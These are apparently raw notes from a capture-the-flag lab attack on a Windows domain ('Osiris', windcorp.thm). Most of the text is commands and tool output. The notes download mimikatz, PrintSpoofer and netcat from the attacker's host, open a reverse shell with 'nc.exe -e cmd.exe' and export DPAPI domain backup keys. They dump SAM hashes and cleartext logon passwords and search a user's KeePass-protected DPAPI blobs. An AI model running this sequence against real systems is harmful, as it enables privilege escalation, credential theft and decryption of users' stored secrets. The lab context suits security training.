[23:56:22:061] [318193:318194] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[23:56:23:244] [318193:318194] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[23:56:23:245] [318193:318255] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [share] (static)
[23:56:23:265] [318193:318194] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[23:56:23:265] [318193:318194] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[23:56:25:356] [318193:318194] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_BUMP_OPTIONS]


Next, we will need to logoff any existing Logon Session by using `logoff Session_ID` command as Windows only allow one logon session per computer unless otherwise configured.

We use `query user` command to check the Logon Session.

Once we Remote Desktop in (for our case, we use the user created above - hacker, rather than login as `chajoh`), we try to open the KeePass however, it prompt error due to masterkey in DPAPI encrypted using user password.

And we overwrite `chajoh` password and the masterkey in DPAPI mis-matched !

We are unable to recovered it, hence we have to go back to the domain controller - `Ra` to get the DPAPI Backup Key.

We access back to `Ra` domain controller and upload mimikatz to the server, then we execute command below to export DPAPI key.

---
https://jarnobaselier.nl/crack-dpapi-met-cqure-cqtools/

https://github.com/BlackDiverX/cqtools (CQDPAPIBlobSearcher.exe)
https://cqureacademy.com/tools-from-dpapi-and-dpapi-ng-decryption-toolkit-black-hat-conference-session (CQMasterKeyAD.exe)

steps to download it:

unzip CQUREAcademy_DPAPIToolkit.txt
mv CQUREAcademy_DPAPIToolkit.txt CQUREAcademy_DPAPIToolkit.zip
7z x CQUREAcademy_DPAPIToolkit.zip
pass:cqure

not work
so just crack it with john

zip2john CQUREAcademy_DPAPIToolkit.zip > hash 

┌──(root㉿kali)-[/home/kali/Osiris]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 140 password hashes with 140 different salts (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Loaded hashes with cost 1 (HMAC size) varying from 378 to 1533995
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:59:24 3.05% (ETA: 2023-01-05 18:44) 0g/s 141.3p/s 19863c/s 19863C/s ininin..happyfun
Session aborted

https://vulners.com/kitploit/KITPLOIT:6746021671609104143

**Password: CQUREAcademy#123!**

let's test it

┌──(root㉿kali)-[/home/kali/Osiris]
└─# 7z x CQUREAcademy_DPAPIToolkit.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 6478300 bytes (6327 KiB)

Extracting archive: CQUREAcademy_DPAPIToolkit.zip
--
Path = CQUREAcademy_DPAPIToolkit.zip
Type = zip
Physical Size = 6478300

    
Enter password (will not be echoed): CQUREAcademy#123!
Everything is Ok                                                             

Folders: 3
Files: 140
Size:       15696659
Compressed: 6478300

Actually I did test CQURE then watch https://www.youtube.com/watch?v=7D_WUJJKZdQ&t=1038s&ab_channel=BlackHat

:)
┌──(root㉿kali)-[/home/kali/Osiris/CQUREAcademy_DPAPIToolkit]
└─# ls -lah
-rw-r--r-- 1 root root  61K May 27  2015 CQMasterKeyAD.exe

I'll upload here


---

*Evil-WinRM* PS C:\Users\WittyAle\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.exe
*Evil-WinRM* PS C:\Users\WittyAle\Documents> dir


    Directory: C:\Users\WittyAle\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/4/2023   8:51 AM        1355264 mimikatz.exe

*Evil-WinRM* PS C:\Users\WittyAle\Documents> ./mimikatz.exe "lsadump::backupkeys /system:localhost /export" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::backupkeys /system:localhost /export

Current prefered key:       {07ea03b4-3b28-4270-8862-0bc66dacef1a}
  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   :
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES
        Private export : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.keyx.rsa.pvk'
        PFX container  : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx'
        Export         : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.der'

Compatibility prefered key: {887f3d05-3f50-4a1d-88c0-9a4b27e913c8}
  * Legacy key
92ce4fd5a55d6d7742135d325b09fd68aa0ad796fcc6eb2636663cec51a6b8fe
2a8933f4a98f7f97c303495d6579f83bd3678c65f9ffa28eca94e1d7f674bd33
90247312bf23dc6cd1ca1e1202748742dd0e80a48fb5579f5eeb4f461197f770
2033abcde34ca01f22cc5326089c1b14fbe95ef4431eabb475f7d910a53a18f9
11f0773bd40cf5382fdb0ea5c9e6fb12ad109fbd2195b71123ffc6bebd98ccfb
6034895425694257da9679081b9bc74aa0eeeaf68ace38df4bd26cf4d4100b6c
cf23bf6aef814bfcb824674b92fab623736d4f3187cbad2d0be6c893f191c8ea
eeec95d2cbe0a3149813bd02532a9f0f1f951755a7137060ffad541446333057

        Export         : OK - 'ntds_legacy_0_887f3d05-3f50-4a1d-88c0-9a4b27e913c8.key'

mimikatz(commandline) # exit
Bye!

*Evil-WinRM* PS C:\Users\WittyAle\Documents> download ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx

┌──(kali㉿kali)-[~/ra]
└─$ ls -lah
total 62M
drwxr-xr-x   2 kali kali 4.0K Jan  4 12:17  .
drwxr-xr-x 111 kali kali  12K Jan  4 12:02  ..
-rw-r--r--   1 kali kali   45 Nov 11 00:09 'Flag 1.txt'
-rw-r--r--   1 kali kali  590 Nov 22 12:51  hash
-rw-r--r--   1 kali kali   80 Nov 22 13:26  hosts.txt
-rwxr-xr-x   1 kali kali 2.2M Jan  4 12:03  Invoke-Mimikatz.ps1
-rw-r--r--   1 kali kali 1.3M Jan  4 11:44  mimikatz.exe
-rw-r--r--   1 kali kali  756 Jan  4 12:16  ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.der
-rw-r--r--   1 kali kali 1.2K Jan  4 12:16  ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.keyx.rsa.pvk
-rw-r--r--   1 kali kali 2.5K Jan  4 12:16  ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx
-rw-r--r--   1 kali kali  256 Jan  4 12:17  ntds_legacy_0_887f3d05-3f50-4a1d-88c0-9a4b27e913c8.key
-rw-r--r--   1 kali kali  58M Nov 22 12:32  spark_3_0_0.deb

---
---
Invoke-WebRequest "http://10.10.103.96:1234/PrintSpoofer.exe" -outfile "C:\temp\PrintSpoofer.exe"
cd c:\temp
Invoke-WebRequest "http://10.10.103.96:1234/nc.exe" -outfile "C:\temp\nc.exe"
.\PrintSpoofer.exe -c ".\nc.exe -e cmd.exe 10.8.19.103 8888"


mimikatz # privilege::debug                                            
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

820	{0;000003e7} 1 D 26929     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 4925357   	NT AUTHORITY\SYSTEM	S-1-5-18(04g,28p)	Primary
 * Thread Token  : {0;000003e7} 1 D 4989776   	NT AUTHORITY\SYSTEM	S-1-5-18(04g,21p)	Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : OSIRIS
SysKey : fb2f42c056c3a91c3f8892df313f2481
Local SID : S-1-5-21-2412384816-2079449310-1594074140

SAMKey : deb70b7d4489f5a99f9a4b14d313a6d7

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 68d59237d0413b8aa399130160f43832

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 87dd9bf09adb470a99630d9137859fcc

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1c10d48561f29e8597681814981354ab2cedbed8d66336efdc33efe4d142287c
      aes128_hmac       (4096) : 2e5f16df97ea20475ab0900fee280c4f
      des_cbc_md5       (4096) : 1320543e800131c8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 1320543e800131c8


RID  : 000003eb (1003)
User : scheduler
  Hash NTLM: 641ca8dc1dc918cd16c054d4bcbb9edb
    lm  - 0: 9ed1e5e7c677bc8294ec0ebc2d724670
    ntlm- 0: 641ca8dc1dc918cd16c054d4bcbb9edb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : fc94ba20e15b41688efa20c0c654eb66

* Primary:Kerberos-Newer-Keys *
    Default Salt : OSIRIS.WINDCORP.THMscheduler
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d19f5875d5fea2756ad7871e659973782b281dc37318aedb8b0550f73f1f7c6b
      aes128_hmac       (4096) : 519f0f730dda41ae9cebac31e97ee2ef
      des_cbc_md5       (4096) : ae454aea7c57f7b3

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : OSIRIS.WINDCORP.THMscheduler
    Credentials
      des_cbc_md5       : ae454aea7c57f7b3


RID  : 000003ec (1004)
User : hacker
  Hash NTLM: 4c05b64dec614df2b522c401bb8d8994
    lm  - 0: 121ad37d26a423d4484e8bb96d3088f6
    ntlm- 0: 4c05b64dec614df2b522c401bb8d8994

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92ebbe90b21210ec8336e49926c74858

* Primary:Kerberos-Newer-Keys *
    Default Salt : OSIRIS.WINDCORP.THMhacker
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4ec2de9f26b962dad27e403f8b6c410e418b5ef0cf7bc085bd24e10cf0ae6def
      aes128_hmac       (4096) : e86614d880d775172389e8dfb0b09816
      des_cbc_md5       (4096) : 68c43d979262528a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : OSIRIS.WINDCORP.THMhacker
    Credentials
      des_cbc_md5       : 68c43d979262528a

need to query

mimikatz # ts::sessions

Session: *0 - Services
  state: Disconnected (4)
  user :  @ 
  curr : 1/4/2023 3:52:51 PM
  lock : no

Session: 1 - 
  state: Disconnected (4)
  user : alcrez @ WINDCORP
  Conn : 1/4/2023 2:55:46 PM
  disc : 1/4/2023 3:03:18 PM
  logon: 1/4/2023 2:55:58 PM
  last : 1/4/2023 3:03:18 PM
  curr : 1/4/2023 3:52:51 PM
  lock : no

Session: 3 - Console
  state: Connected (1)
  user :  @ 
  Conn : 1/4/2023 3:03:19 PM
  curr : 1/4/2023 3:52:51 PM
  lock : no

Session: 4 - 
  state: Disconnected (4)
  user : hacker @ OSIRIS
  Conn : 1/4/2023 3:41:33 PM
  disc : 1/4/2023 3:41:37 PM
  logon: 1/4/2023 3:03:52 PM
  last : 1/4/2023 3:41:37 PM
  curr : 1/4/2023 3:52:51 PM
  lock : no

Session: 65536 - 31C5CE94259D4006A9E4
  state: Listen (6)
  user :  @ 
  lock : no

Session: 65537 - RDP-Tcp
  state: Listen (6)
  user :  @ 
  lock : no


mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2907544 (00000000:002c5d98)
Session           : RemoteInteractive from 4
User Name         : hacker
Domain            : OSIRIS
Logon Server      : OSIRIS
Logon Time        : 1/4/2023 3:03:51 PM
SID               : S-1-5-21-2412384816-2079449310-1594074140-1004
	msv :	
	 [00000003] Primary
	 * Username : hacker
	 * Domain   : OSIRIS
	 * NTLM     : 4c05b64dec614df2b522c401bb8d8994
	 * SHA1     : 86f032c64abb9b6da5031973abd1a2fa373fdfea
	tspkg :	
	wdigest :	
	 * Username : hacker
	 * Domain   : OSIRIS
	 * Password : (null)
	kerberos :	
	 * Username : hacker
	 * Domain   : OSIRIS
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 2907512 (00000000:002c5d78)
Session           : RemoteInteractive from 4
User Name         : hacker
Domain            : OSIRIS
Logon Server      : OSIRIS
Logon Time        : 1/4/2023 3:03:51 PM
SID               : S-1-5-21-2412384816-2079449310-1594074140-1004
	msv :	
	 [00000003] Primary
	 * Username : hacker
	 * Domain   : OSIRIS
	 * NTLM     : 4c05b64dec614df2b522c401bb8d8994
	 * SHA1     : 86f032c64abb9b6da5031973abd1a2fa373fdfea
	tspkg :	
	wdigest :	
	 * Username : hacker
	 * Domain   : OSIRIS
	 * Password : (null)
	kerberos :	
	 * Username : hacker
	 * Domain   : OSIRIS
	 * Password : hackP@ssw0rd
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 2889037 (00000000:002c154d)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/4/2023 3:03:50 PM
SID               : S-1-5-90-0-4
	msv :	
	 [00000003] Primary
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
	tspkg :	
	wdigest :	
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * Password : (null)
	kerberos :	
	 * Username : OSIRIS$
	 * Domain   : windcorp.thm
	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 2888990 (00000000:002c151e)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/4/2023 3:03:50 PM
SID               : S-1-5-90-0-4
	msv :	
	 [00000003] Primary
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
	tspkg :	
	wdigest :	
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * Password : (null)
	kerberos :	
	 * Username : OSIRIS$
	 * Domain   : windcorp.thm
	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 2882379 (00000000:002bfb4b)
Session           : Interactive from 4
User Name         : UMFD-4
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/4/2023 3:03:50 PM
SID               : S-1-5-96-0-4
	msv :	
	 [00000003] Primary
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
	tspkg :	
	wdigest :	
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * Password : (null)
	kerberos :	
	 * Username : OSIRIS$
	 * Domain   : windcorp.thm
	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 1348627 (00000000:00149413)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/4/2023 3:03:19 PM
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
	tspkg :	
	wdigest :	
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * Password : (null)
	kerberos :	
	 * Username : OSIRIS$
	 * Domain   : windcorp.thm
	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 1348598 (00000000:001493f6)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/4/2023 3:03:19 PM
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
	tspkg :	
	wdigest :	
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * Password : (null)
	kerberos :	
	 * Username : OSIRIS$
	 * Domain   : windcorp.thm
	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 1344521 (00000000:00148409)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/4/2023 3:03:18 PM
SID               : S-1-5-96-0-3
	msv :	
	 [00000003] Primary
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * NTLM     : 53ac087ef5ce0a0a38b47ede5e503ccd
	 * SHA1     : 17b965312216e8e8fb0efb27d4dcc672acf1523f
	tspkg :	
	wdigest :	
	 * Username : OSIRIS$
	 * Domain   : WINDCORP
	 * Password : (null)
	kerberos :	
	 * Username : OSIRIS$
	 * Domain   : windcorp.thm
	 * Password : jX$=0W`_%B-)At]>;XJYg=$K-qC2\",Q)pnppnP&KBdeu =8"O1T'9N7soEJ s$g*=B[-hip0%iuQop4$.!'qy+V;"n'O?l?)Ne u:+jN<i6TDz!ENcE#=nX
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 386343 (00000000:0005e527)
Session           : Interactive from 1
User Name         : alcrez
Domain            : WINDCORP
Logon Server      : FIRE
Logon Time        : 1/4/2023 2:55:58 PM
SID               : S-1-5-21-555431066-3599073733-176599750-1395
	msv :	
	 [00000003] Primary
	 * Username : alcrez
	 * Domain   : WINDCORP
	 * NTLM     : 59390dfc44a2640ea82eb9812f670398
	 * SHA1     : 88006ed121e0168e7d6dd0ac95496cf1f7c5e126
	 * DPAPI    : 6c890b1acd51ce5b894651042ae3de9b
	tspkg :	
	wdigest :	
	 * Username : alcrez
	 * Domain   : WINDCORP
	 * Password : (null)
	kerberos :	
	 * Username : alcrez
	 * Domain   : WINDCORP.THM
	 * Password : pepperKakehuS#12

alcrez:pepperKakehuS#12
---

PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx -o DMK.pfx
PS C:\temp> dir
dir


    Directory: C:\temp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/16/2020  11:55 AM                OpenVPN                                                              
-a----          1/6/2023   8:07 AM           2554 DMK.pfx                                                              
-a----          1/6/2023   7:05 AM           6656 ivpn.exe                                                             
-a----          1/6/2023   7:11 AM        1291016 mimikatz.exe  

PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/CQMasterKeyAD.exe -o CQMasterKeyAD.exe
PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/CQDPAPIBlobSearcher.exe -o CQDPAPIBlobSearcher.exe
PS C:\temp> dir
dir


    Directory: C:\temp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/16/2020  11:55 AM                OpenVPN                                                              
-a----          1/6/2023   8:09 AM         219648 CQDPAPIBlobSearcher.exe                                              
-a----          1/6/2023   8:09 AM          62464 CQMasterKeyAD.exe                                                    
-a----          1/6/2023   8:07 AM           2554 DMK.pfx                                                              
-a----          1/6/2023   7:05 AM           6656 ivpn.exe                                                             
-a----          1/6/2023   7:11 AM        1291016 mimikatz.exe                                                         

PS C:\temp> ./CQDPAPIBlobSearcher.exe /d c:\users\chajoh\appdata\roaming /r /o c:\users\chajoh\Desktop
./CQDPAPIBlobSearcher.exe /d c:\users\chajoh\appdata\roaming /r /o c:\users\chajoh\Desktop
Scanning c:\users\chajoh\appdata\roaming\KeePass\KeePass.config.xml
Scanning c:\users\chajoh\appdata\roaming\KeePass\ProtectedUserKey.bin
Found 1 in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin
 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
98 9A 82 53 43 24 EC E4 F7 F5 3A 0A 19 53 C6 89   ...SC$....:..S..
49 86 2B 18 F2 A2 01 C9 50 0E 0B 2B DC A4 1E 46   I.+.....P..+...F
C1 50 25 DC 99 B3 F7 3E B5 01 85 51 AB D9 C6 1D   .P%....>...Q....
EC 6A 9A B8 A6 98 93 DB 8A F8 6F 1B 17 E7 02 25   .j........o....%
64 95 95 8B CD 2C CD DB                           d....,..
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
Found 2 in c:\users\chajoh\appdata\roaming\microsoft\crypto\keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
 description:          Private Key Properties
 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
0D 78 6B E1 B5 2C F4 6D 4C 55 85 FE C0 07 04 3D   .xk..,.mLU.....=
11 1C 2B BA D7 6A B6 27 D3 B8 D4 B3 09 89 70 3F   ..+..j.'......p?
E2 62 D8 C0 2B 2C 63 97 84 B7 41 92 34 70 AB 05   .b..+,c...A.4p..
29 39 4B 61 D1 4A D6 44                           )9Ka.J.D
 description:          Private Key
 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
07 70 C4 CE 60 1B D8 C5 6E 5C 8D 03 16 1A 01 56   .p..`...n\.....V
E2 B1 30 3C 5C CE A9 94 E8 12 BF 07 F6 9C 90 6F   ..0<\..........o
A7 4E 50 79 77 17 7F 84 52 06 C1 2C 3F 72 89 E4   .NPyw...R..,?r..
9E CF 05 06 09 74 0D 30 E4 8C CE 75 9E 35 69 F0   .....t.0...u.5i.
65 82 1C D0 C5 11 8C 30 01 ED F6 42 39 70 D8 A2   e......0...B9p..
1F 62 46 42 D8 39 2F 15 5D F4 2E CD D9 02 45 1C   .bFB.9/.].....E.
E9 87 B5 50 26 CB 5D 74 28 62 69 C1 A7 40 E9 1C   ...P&.]t(bi..@..
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\File Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\MMC\eventvwr
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Network\Connections\Pbk\_hiddenPbk\rasphone.pbk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\CREDHIST
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\SYNCHIST
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\BK-WINDCORP
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\Preferred
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.acl
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.dic
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.exc
Scanning c:\users\chajoh\appdata\roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\AccountPictures\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\CameraRoll.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Documents.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Music.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Pictures.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\SavedPictures.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Videos.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database.kdbx.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database2.kdbx.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\The Internet.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts (2).lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\7e4dca80246863e3.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\ccba5a5986c77e43.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\d97efdf3888fe7eb.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\4ac866364817f10c.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\7e4dca80246863e3.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\9d1f905ce5044aee.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\ccba5a5986c77e43.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f01b4d95cf55d32a.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f18460fded109990.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Bluetooth File Transfer.LNK
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Documents.mydocs
